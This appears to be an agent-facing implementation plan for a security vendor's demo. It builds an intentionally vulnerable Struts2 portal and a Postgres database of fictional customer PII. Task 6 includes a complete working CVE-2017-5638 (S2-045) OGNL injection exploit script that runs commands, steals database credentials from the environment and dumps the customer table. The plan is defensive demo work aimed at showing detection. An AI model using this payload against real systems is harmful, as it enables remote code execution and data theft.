# Golden Demo Core (Plan 1) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a deliberately vulnerable "customer admin portal" (Apache Struts2, CVE-2017-5638) plus a Postgres database of fake customer PII, wire them together locally with docker-compose, and prove an attacker can return database credentials and the full customer table in plain text through a single reflected-RCE HTTP request.

**Architecture:** A minimal Struts2 WAR served by Tomcat connects to Postgres using credentials injected as environment variables (mirroring the Kubernetes Secret pattern Plan 2 will use). The portal is vulnerable to the S2-045 Jakarta Multipart OGNL injection, which reflects arbitrary command output in the HTTP response. The exploit needs no attacker callback infrastructure - everything happens in one request, which suits the air-gapped narrative.

**Tech Stack:** Java 8, Apache Struts2 2.5.10, Maven (multi-stage Docker build), Tomcat 8.5 (jre8), PostgreSQL, postgresql-client, a Docker user-defined network, curl.

**Prerequisites for execution:** Docker running (colima or Docker Desktop). No docker-compose required - containers are wired with a plain Docker network and run scripts. Internet access *at build time only* (Maven and base-image pulls); the resulting images are self-contained for air-gapped use.

---

## File Structure

- `app/pom.xml` - Maven build for the Struts2 WAR.
- `app/src/main/java/com/acme/CustomerAction.java` - the legit action that lists customers from Postgres (justifies the DB creds in the portal env).
- `app/src/main/resources/struts.xml` - Struts config; maps the action, forces the Jakarta multipart parser.
- `app/src/main/webapp/WEB-INF/web.xml` - servlet/filter config.
- `app/src/main/webapp/index.jsp` - portal landing page (themed).
- `app/src/main/webapp/customers.jsp` - renders the customer list.
- `app/Dockerfile` - multi-stage: Maven build then Tomcat runtime with psql client.
- `db/initdb/seed.sql` - creates and seeds the `customers` table with fake PII.
- `scripts/run-local.sh` - creates a Docker network, starts postgres + portal, injects DB creds into the portal as env vars.
- `scripts/stop-local.sh` - removes the containers and network.
- `scripts/exploit-local.sh` - the three escalating curls (prove RCE, steal creds, steal table).
- `.gitignore` - ignore Maven `target/`.
- `README.md` - one-paragraph orientation + how to run locally.

---

## Task 1: Project scaffold

**Files:**
- Create: `.gitignore`
- Create: `README.md`

- [ ] **Step 1: Write `.gitignore`**

```
target/
*.war
*.class
.DS_Store
```

- [ ] **Step 2: Write `README.md`**

```markdown
# Sysdig On-Prem Golden Demo

A repeatable demo of a preventable breach: a vulnerable customer-admin portal
(Apache Struts2, CVE-2017-5638 - the Equifax bug) leaks its customer database to
an attacker already inside an air-gapped environment, and Sysdig Secure catches
and stops it at runtime.

Design: `docs/superpowers/specs/2026-06-04-sysdig-golden-demo-design.md`

## Run the core locally (Plan 1)

```bash
./scripts/run-local.sh
./scripts/exploit-local.sh
./scripts/stop-local.sh
```

WARNING: this project is intentionally vulnerable. Never expose it to an
untrusted network. Run only in an isolated lab.
```

- [ ] **Step 3: Commit**

```bash
git add .gitignore README.md
git commit -m "Scaffold golden demo project"
```

---

## Task 2: Minimal vulnerable Struts2 web application

**Files:**
- Create: `app/pom.xml`
- Create: `app/src/main/resources/struts.xml`
- Create: `app/src/main/webapp/WEB-INF/web.xml`
- Create: `app/src/main/java/com/acme/CustomerAction.java`
- Create: `app/src/main/webapp/index.jsp`
- Create: `app/src/main/webapp/customers.jsp`

- [ ] **Step 1: Write `app/pom.xml`**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.acme</groupId>
  <artifactId>customer-portal</artifactId>
  <version>1.0</version>
  <packaging>war</packaging>

  <properties>
    <maven.compiler.source>8</maven.compiler.source>
    <maven.compiler.target>8</maven.compiler.target>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
  </properties>

  <dependencies>
    <dependency>
      <groupId>org.apache.struts</groupId>
      <artifactId>struts2-core</artifactId>
      <version>2.5.10</version>
    </dependency>
    <dependency>
      <groupId>org.postgresql</groupId>
      <artifactId>postgresql</artifactId>
      <version>42.2.5</version>
    </dependency>
    <dependency>
      <groupId>javax.servlet</groupId>
      <artifactId>javax.servlet-api</artifactId>
      <version>3.1.0</version>
      <scope>provided</scope>
    </dependency>
    <dependency>
      <groupId>javax.servlet.jsp</groupId>
      <artifactId>javax.servlet.jsp-api</artifactId>
      <version>2.3.1</version>
      <scope>provided</scope>
    </dependency>
  </dependencies>

  <build>
    <finalName>customer-portal</finalName>
    <plugins>
      <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-war-plugin</artifactId>
        <version>3.2.3</version>
        <configuration>
          <failOnMissingWebXml>false</failOnMissingWebXml>
        </configuration>
      </plugin>
    </plugins>
  </build>
</project>
```

- [ ] **Step 2: Write `app/src/main/webapp/WEB-INF/web.xml`**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
         version="3.1">
  <display-name>Acme Customer Admin Portal</display-name>
  <filter>
    <filter-name>struts2</filter-name>
    <filter-class>org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter</filter-class>
  </filter>
  <filter-mapping>
    <filter-name>struts2</filter-name>
    <url-pattern>/*</url-pattern>
  </filter-mapping>
  <welcome-file-list>
    <welcome-file>index.jsp</welcome-file>
  </welcome-file-list>
</web-app>
```

- [ ] **Step 3: Write `app/src/main/resources/struts.xml`**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE struts PUBLIC
    "-//Apache Software Foundation//DTD Struts Configuration 2.5//EN"
    "http://struts.apache.org/dtds/struts-2.5.dtd">
<struts>
  <constant name="struts.multipart.parser" value="jakarta"/>
  <constant name="struts.devMode" value="false"/>
  <package name="default" namespace="/" extends="struts-default">
    <action name="customers" class="com.acme.CustomerAction">
      <result name="success">/customers.jsp</result>
    </action>
  </package>
</struts>
```

- [ ] **Step 4: Write `app/src/main/java/com/acme/CustomerAction.java`**

```java
package com.acme;

import com.opensymphony.xwork2.ActionSupport;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.List;

public class CustomerAction extends ActionSupport {

    private List<String> customers = new ArrayList<>();

    @Override
    public String execute() {
        String host = env("PGHOST", "postgres");
        String db = env("PGDATABASE", "customers");
        String user = env("PGUSER", "portal");
        String pass = env("PGPASSWORD", "");
        String url = "jdbc:postgresql://" + host + ":5432/" + db;
        try (Connection c = DriverManager.getConnection(url, user, pass);
             Statement s = c.createStatement();
             ResultSet rs = s.executeQuery("SELECT name, email FROM customers LIMIT 5")) {
            while (rs.next()) {
                customers.add(rs.getString(1) + " <" + rs.getString(2) + ">");
            }
        } catch (Exception e) {
            customers.add("DB error: " + e.getMessage());
        }
        return SUCCESS;
    }

    private static String env(String key, String dflt) {
        String v = System.getenv(key);
        return v != null ? v : dflt;
    }

    public List<String> getCustomers() {
        return customers;
    }
}
```

- [ ] **Step 5: Write `app/src/main/webapp/index.jsp`**

```jsp
<%@ page contentType="text/html;charset=UTF-8" %>
<html>
<head><title>Acme Customer Admin Portal</title></head>
<body style="font-family: sans-serif; max-width: 600px; margin: 40px auto;">
  <h1>Acme Customer Admin Portal</h1>
  <p>Internal tool for managing customer records.</p>
  <p><a href="customers.action">View recent customers</a></p>
</body>
</html>
```

- [ ] **Step 6: Write `app/src/main/webapp/customers.jsp`**

```jsp
<%@ page contentType="text/html;charset=UTF-8" %>
<%@ taglib prefix="s" uri="/struts-tags" %>
<html>
<head><title>Customers</title></head>
<body style="font-family: sans-serif; max-width: 600px; margin: 40px auto;">
  <h1>Recent Customers</h1>
  <ul>
    <s:iterator value="customers">
      <li><s:property/></li>
    </s:iterator>
  </ul>
  <p><a href="index.jsp">Back</a></p>
</body>
</html>
```

- [ ] **Step 7: Verify the WAR builds (acts as the test for this task)**

Run: `cd app && mvn -q -DskipTests package`
Expected: BUILD SUCCESS and `app/target/customer-portal.war` exists. Verify with `ls app/target/customer-portal.war`.

- [ ] **Step 8: Commit**

```bash
git add app/
git commit -m "Add vulnerable Struts2 customer portal"
```

---

## Task 3: Portal Docker image

**Files:**
- Create: `app/Dockerfile`

- [ ] **Step 1: Write `app/Dockerfile`**

```dockerfile
# Stage 1: build the WAR. Internet needed here (build time only).
FROM maven:3.6-jdk-8 AS build
WORKDIR /src
COPY pom.xml .
COPY src ./src
RUN mvn -q -DskipTests package

# Stage 2: runtime. Old Tomcat + JDK8 = reliable S2-045 + rich base-image CVEs.
FROM tomcat:8.5-jre8
# psql client baked in at build time (no runtime downloads - air-gap safe).
RUN apt-get update \
    && apt-get install -y --no-install-recommends postgresql-client \
    && rm -rf /var/lib/apt/lists/*
RUN rm -rf /usr/local/tomcat/webapps/*
COPY --from=build /src/target/customer-portal.war /usr/local/tomcat/webapps/ROOT.war
EXPOSE 8080
```

- [ ] **Step 2: Build the image (test for this task)**

Run: `docker build -t golden-demo/portal:vuln app/`
Expected: image builds successfully. Verify with `docker images | grep golden-demo/portal`.

Note: if the `tomcat:8.5-jre8` or `maven:3.6-jdk-8` tag is unavailable, substitute the nearest available `*-jre8` / `*-jdk-8` tag and record the working tag in the plan. Tomcat version does not affect the Struts vulnerability.

- [ ] **Step 3: Smoke-test the portal in isolation**

Run:
```bash
docker run --rm -d -p 8080:8080 --name portal-smoke golden-demo/portal:vuln
sleep 15
curl -s http://localhost:8080/ | grep -i "Acme Customer Admin Portal"
docker rm -f portal-smoke
```
Expected: the landing-page title line is printed (Tomcat is up and serving the WAR).

- [ ] **Step 4: Commit**

```bash
git add app/Dockerfile
git commit -m "Add portal Docker image"
```

---

## Task 4: Postgres database with seeded customer PII

**Files:**
- Create: `db/initdb/seed.sql`

- [ ] **Step 1: Write `db/initdb/seed.sql`**

```sql
CREATE TABLE customers (
    id      SERIAL PRIMARY KEY,
    name    TEXT NOT NULL,
    email   TEXT NOT NULL,
    card    TEXT NOT NULL
);

INSERT INTO customers (name, email, card) VALUES
    ('Alice Hopper',   'alice.hopper@example.com',   '4111-1111-1111-1111'),
    ('Bilal Rashid',   'bilal.rashid@example.com',   '4222-2222-2222-2222'),
    ('Carmen Diaz',    'carmen.diaz@example.com',    '4333-3333-3333-3333'),
    ('Deepak Nair',    'deepak.nair@example.com',    '4444-4444-4444-4444'),
    ('Evelyn Stone',   'evelyn.stone@example.com',   '4555-5555-5555-5555'),
    ('Farah Osman',    'farah.osman@example.com',    '4666-6666-6666-6666'),
    ('Gus Lindqvist',  'gus.lindqvist@example.com',  '4777-7777-7777-7777'),
    ('Hana Kim',       'hana.kim@example.com',       '4888-8888-8888-8888');
```

Note: all data is fictional. The official Postgres image runs any `*.sql` in
`/docker-entrypoint-initdb.d/` on first start.

- [ ] **Step 2: Verify the seed runs (test for this task)**

Run:
```bash
docker run --rm -d --name pg-smoke \
  -e POSTGRES_USER=portal -e POSTGRES_PASSWORD=s3cr3t -e POSTGRES_DB=customers \
  -v "$PWD/db/initdb:/docker-entrypoint-initdb.d:ro" \
  postgres:13
sleep 12
docker exec pg-smoke psql -U portal -d customers -c "SELECT count(*) FROM customers;"
docker rm -f pg-smoke
```
Expected: a count of `8`.

- [ ] **Step 3: Commit**

```bash
git add db/
git commit -m "Add Postgres seed of fake customer PII"
```

---

## Task 5: Wire portal + database on a Docker network

**Files:**
- Create: `scripts/run-local.sh`
- Create: `scripts/stop-local.sh`

No docker-compose: a user-defined Docker network gives the portal DNS resolution
of the `postgres` container by name. This works identically under colima.

- [ ] **Step 1: Write `scripts/run-local.sh`**

```bash
#!/usr/bin/env bash
# Build and start the portal + Postgres on a shared Docker network.
set -euo pipefail

NET=golden-demo
ROOT="$(cd "$(dirname "$0")/.." && pwd)"

docker network inspect "$NET" >/dev/null 2>&1 || docker network create "$NET"
docker rm -f portal postgres >/dev/null 2>&1 || true

docker run -d --name postgres --network "$NET" \
  -e POSTGRES_USER=portal -e POSTGRES_PASSWORD=s3cr3t -e POSTGRES_DB=customers \
  -v "$ROOT/db/initdb:/docker-entrypoint-initdb.d:ro" \
  postgres:13

docker build -t golden-demo/portal:vuln "$ROOT/app"

# PGPASSWORD is deliberately in the portal env - it is exactly what the attacker
# steals. Mirrors the Kubernetes Secret-to-env pattern Plan 2 uses.
docker run -d --name portal --network "$NET" \
  -e PGHOST=postgres -e PGDATABASE=customers -e PGUSER=portal -e PGPASSWORD=s3cr3t \
  -p 8080:8080 \
  golden-demo/portal:vuln

echo "Started. Give Tomcat ~20s to deploy the WAR."
```

- [ ] **Step 2: Write `scripts/stop-local.sh`**

```bash
#!/usr/bin/env bash
# Remove the local demo containers and network.
set -euo pipefail
docker rm -f portal postgres >/dev/null 2>&1 || true
docker network rm golden-demo >/dev/null 2>&1 || true
echo "Stopped and cleaned up."
```

- [ ] **Step 3: Start the stack**

Run:
```bash
chmod +x scripts/run-local.sh scripts/stop-local.sh
./scripts/run-local.sh
```
Expected: both `postgres` and `portal` containers running. Verify with `docker ps --format '{{.Names}}'` (shows `portal` and `postgres`).

- [ ] **Step 4: Verify the portal legitimately reads the DB (test for this task)**

Run:
```bash
sleep 20
curl -s http://localhost:8080/customers.action | grep -i "example.com"
```
Expected: at least one seeded customer email appears in the rendered page. This
proves the portal genuinely connects to Postgres using the env credentials.

- [ ] **Step 5: Commit**

```bash
git add scripts/run-local.sh scripts/stop-local.sh
git commit -m "Add local run/stop scripts wiring portal and Postgres on a Docker network"
```

---

## Task 6: Prove the reflected-RCE exploit (the core de-risk)

**Files:**
- Create: `scripts/exploit-local.sh`

This task is the heart of Plan 1: prove CVE-2017-5638 returns arbitrary command
output in plain text, then escalate to stealing creds and the customer table.

- [ ] **Step 1: Write `scripts/exploit-local.sh`**

```bash
#!/usr/bin/env bash
# Local proof of the CVE-2017-5638 (S2-045) reflected RCE against the portal.
# Each request returns the command's stdout in the HTTP response body.
set -euo pipefail

TARGET="${TARGET:-http://localhost:8080/customers.action}"

# S2-045 OGNL payload. %CMD% is replaced per call. The payload clears OGNL
# member-access restrictions, runs the command via /bin/bash -c, and copies
# the process stdout into the HTTP response output stream.
payload() {
  local cmd="$1"
  printf '%s' "%{(#_='multipart/form-data')."\
"(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."\
"(#_memberAccess?(#_memberAccess=#dm):"\
"((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."\
"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."\
"(#ognlUtil.getExcludedPackageNames().clear())."\
"(#ognlUtil.getExcludedClasses().clear())."\
"(#context.setMemberAccess(#dm))))."\
"(#cmd='${cmd}')."\
"(#cmds={'/bin/bash','-c',#cmd})."\
"(#p=new java.lang.ProcessBuilder(#cmds))."\
"(#p.redirectErrorStream(true)).(#process=#p.start())."\
"(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."\
"(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."\
"(#ros.flush())}"
}

run() {
  local label="$1"; local cmd="$2"
  echo "===== ${label} ====="
  curl -s "$TARGET" -H "Content-Type: $(payload "$cmd")"
  echo
}

# 1. Prove code execution.
run "STEP 1: prove RCE (id)" "id"

# 2. Steal the database credentials from the environment (plain text).
run "STEP 2: steal DB credentials" "env | grep -i PG"

# 3. Steal the entire customer table (plain text) using the stolen creds.
run "STEP 3: dump customer table" \
  'PGPASSWORD=$PGPASSWORD pg_dump -h $PGHOST -U $PGUSER -t customers --data-only $PGDATABASE'
```

- [ ] **Step 2: Make it executable and ensure the stack is up**

Run:
```bash
chmod +x scripts/exploit-local.sh
./scripts/run-local.sh
sleep 20
```
Expected: no error; portal reachable.

- [ ] **Step 3: Run the exploit (test for this task)**

Run: `./scripts/exploit-local.sh`
Expected:
- STEP 1 prints a `uid=...gid=...` line (RCE confirmed).
- STEP 2 prints `PGPASSWORD=s3cr3t`, `PGHOST=postgres`, `PGUSER=portal`, `PGDATABASE=customers`.
- STEP 3 prints `INSERT`/`COPY` data containing the seeded customer names, emails, and card numbers.

If STEP 1 returns the normal HTML page instead of `uid=...`, the multipart
parser path was not hit: retry the request as POST (`curl -X POST ... --data x=1`)
and record the working method in the script. The vulnerability is method-agnostic
in the affected code, but some stacks only trigger on POST.

- [ ] **Step 4: Commit**

```bash
git add scripts/exploit-local.sh
git commit -m "Add local reflected-RCE exploit proving credential and data theft"
```

---

## Task 7: Confirm the CVE is detectable by an image scanner

**Files:** none created; this validates the scan-time story the demo relies on.

- [ ] **Step 1: Scan the portal image**

Run (native trivy; sysdig-cli-scanner is swapped in during Plan 2 at test time):
```bash
trivy image --scanners vuln golden-demo/portal:vuln | grep -i "CVE-2017-5638"
```
Expected: a line referencing `CVE-2017-5638` against `struts2-core`.

- [ ] **Step 2: Record the result**

If `CVE-2017-5638` is not reported, confirm `struts2-core` 2.5.10 is present in
the WAR (`unzip -l app/target/customer-portal.war | grep struts2-core`) and that
the scanner's Java/jar analysis is enabled. Note the outcome in
`docs/superpowers/specs/2026-06-04-sysdig-golden-demo-design.md` section 13.

- [ ] **Step 3: Tear down the local stack**

Run: `./scripts/stop-local.sh`
Expected: containers and network removed.

---

## Self-Review Notes

- Spec coverage: this plan covers spec sections 4 (vulnerability), 5 (exploit
  sequence), 6 (app and db components, minus k8s/scripts/docs which are Plan 2),
  and the build-time scan check of section 2 point 1. Spec sections 7-11
  (runtime detection, two-run response action, air-gap k8s deployment, Sysdig
  config) and the orchestration scripts/runbook are deferred to Plan 2 because
  they require the live cluster and backend.
- The credential names (`PGHOST`/`PGDATABASE`/`PGUSER`/`PGPASSWORD`) are
  consistent across `CustomerAction.java`, `scripts/run-local.sh`, and
  `scripts/exploit-local.sh`.
- No placeholders: every file has complete content and every verification step
  has an exact command and expected output.
```
